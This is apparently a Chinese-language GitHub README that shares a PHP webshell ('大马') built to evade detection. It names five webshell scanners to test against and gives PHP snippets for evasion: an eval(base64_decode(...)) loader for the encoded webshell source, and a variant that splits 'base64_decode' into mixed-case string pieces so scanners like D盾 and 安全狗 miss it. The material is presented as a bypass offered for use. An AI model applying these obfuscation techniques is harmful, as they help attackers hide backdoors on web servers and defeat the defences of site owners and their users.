# S9MF-php-webshell-bypass
为方便WAF入库的项目 | 分享PHP免杀大马 | 菜是原罪 | 多姿势(假的就一个) 

## 前言
- - -
webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。又分大马和小马，大马就是功能比较多的，而小马更像一句话，本文介绍的是免杀PHP大马。  
![1](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qmh8h5snj30aa096dgr.jpg)  

## WAF
- - -
测试用的WAF

WAF |  下载
------------ |  ----------
 D盾_Web查杀  | http://www.d99net.net/down/d_safe_2.1.4.4.zip
 河马webshell查杀 |  http://dl.shellpub.com/hm-ui/latest/HmSetup.zip?version=1.5.0
深信服WebShellKillerTool | http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip
网站安全狗网马查杀 | http://download.safedog.cn/download/software/safedogwzApache.exe
OpenRASP WEBDIR+检测引擎 | https://scanner.baidu.com

![2](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnshf8voj31400idwhz.jpg)
![3](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnsiq1zej314d0ijabt.jpg)
![4](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qnw2hblng303c0370td.gif)

## Test
- - -
首先，我们的思路是以这段代码开始：
```php
<?php
$code = '大马源码base64加密';
eval(base64_decode($code));
?>
```
动图:
![5](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qwjej1y0g30qd0hednu.gif)

waf查杀:  
![6](https://ws1.sinaimg.cn/large/006VEsyOgy1g0qwqzgr9dj30lg06omxe.jpg)

分割函数:
我们把base64_decode大小写分割成多个变量，再合并，并赋值给其他变量。
```
<?php
$a = 'bAsE';
$b = '64_dEcODE';
$c = $a.$b;
$d = $c('code');
eval($d);
```

再用WAF查杀:  
D盾_Web查杀
![7](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r33tc306j30ng09vmyf.jpg)

河马webshell查杀
![8](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r362vy4bj30ly07l3yk.jpg)

深信服WebShellKillerTool
![9](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r36un7ijj30kk071t9r.jpg)

网站安全狗网马查杀
![10](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r384ykhrj30p006ngly.jpg)






